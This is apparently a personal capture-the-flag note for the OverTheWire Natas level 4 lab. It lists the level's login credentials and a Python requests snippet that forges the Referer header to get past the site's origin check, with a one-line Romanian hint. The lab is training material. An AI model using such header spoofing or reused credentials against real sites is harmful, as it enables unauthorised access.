
# General info

Username: natas4
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
URL:      http://natas4.natas.labs.overthewire.org

# Special code section

```py
headers = {
    "Referer" : "http://natas5.natas.labs.overthewire.org/"
}

response = requests.get(
    url="http://natas4.natas.labs.overthewire.org/", 
    auth=("natas4", "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ"),
    headers=headers
)

```

poti pune la `Referer` "locatia" de unde vii